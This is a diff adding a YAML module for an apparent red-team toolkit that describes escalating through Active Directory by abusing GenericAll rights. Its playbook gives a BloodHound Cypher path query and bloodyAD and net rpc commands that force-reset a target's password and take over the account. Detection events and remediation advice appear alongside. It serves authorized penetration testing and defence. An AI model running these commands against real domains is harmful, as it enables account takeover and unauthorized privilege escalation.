@@ -1,0 +1,67 @@
+# GenericAll on a user → password reset → escalation
+#
+# GenericAll grants full write access to a target user object,
+# including the User-Force-Change-Password ExtendedRight. An
+# operator who holds GenericAll on a privileged user (or a user
+# who ultimately reaches DA via nested memberships) resets the
+# target's password, logs in as them, and walks toward DA.
+#
+# fieldkit already ships `fieldkit bloodhound import` for
+# SharpHound-collected data. This TTP surfaces the ROUTE as a
+# ranked next-move: playbook renders the exact Cypher query to
+# identify targets from the ingested graph + the bloodyAD /
+# net rpc / powerview one-liners to execute the reset.
+technique: T1078.002
+name: BloodHound edge — GenericAll on user → password reset
+tactic: [privilege-escalation, credential-access, lateral-movement]
+platform: [windows]
+key: adroute:generic-all-user
+ranking:
+  exploitability: medium           # depends on graph edges the enum found
+  safety: config-change            # resets the target's password
+  detection: moderate               # event 4724 (password reset) + 4720/4738 adjacent
+detect:
+  group_member: Domain Users
+execute:
+  # On-host probe — check that BloodHound-adjacent tools are present
+  # (bloodyAD / rpcclient) so the operator knows what's available.
+  command: |-
+    where bloodyAD.exe 2>nul & where rpcclient 2>nul & echo "GenericAll route surfaced — see playbook for Cypher + exec"
+verify:
+  success: "GenericAll"
+cleanup:
+  command: ""
+report:
+  vector_type: kerberoast          # reuse AD-route bucket
+  evidence: "on a domain (Domain Users); GenericAll route worth checking in BloodHound"
+  description: >
+    A user or computer principal you own may hold GenericAll on a
+    target account via direct ACL or transitive group membership.
+    GenericAll grants force-change-password rights — one call to
+    net rpc / bloodyAD / powerview and the target's password is
+    yours. If the target reaches DA through nested groups or
+    delegation, that's the escalation. BloodHound identifies the
+    reachable targets in one Cypher query.
+  remediation: >
+    Audit ACLs on privileged user accounts — GenericAll (and
+    WriteDACL, WriteOwner, User-Force-Change-Password) should
+    only be held by tier-0 accounts. Use Protected Users +
+    Authentication Silos to gate delegation. Regularly run
+    BloodHound path-finding to spot new "owned → DA via
+    GenericAll" edges introduced by helpdesk automation.
+  refs: [T1078.002, GenericAll, bloodhound]
+playbook:
+  summary: >
+    Domain foothold — check BloodHound for GenericAll edges from
+    your owned principals to any user that reaches DA. Then
+    reset the target's password with bloodyAD / net rpc /
+    powerview.
+  place: 'attacker-side (impacket + bloodhound)'
+  steps:
+    - "in the BloodHound UI or CLI, run: MATCH p=shortestPath((u:User {owned:true})-[r:MemberOf|GenericAll*1..]->(t:User))-[:MemberOf|GenericAll|GenericWrite|WriteOwner|WriteDACL*1..]->(:Group {highvalue:true}) RETURN p"
+    - "pick a target user T whose reset lands you on the DA path"
+    - "reset T's password via bloodyAD: `bloodyAD -d CORP.LOCAL -u <owned-user> -p <pass> --host <dc> set password <T> 'Fk_P@ssw0rd!'`"
+    - "OR via impacket-net rpc: `net rpc password '<T>' 'Fk_P@ssw0rd!' -U 'CORP/<owned-user>%<pass>' -S <dc>`"
+    - "log in as T; walk the next edge (typically MemberOf → DA-adjacent group)"
+    - "CLEANUP: with the T-owner's consent, reset T's password back to a value they choose (fieldkit does NOT keep the original — it wasn't recoverable)"
+  restore: "coordinate with the T-owner to set a new password of their choice"
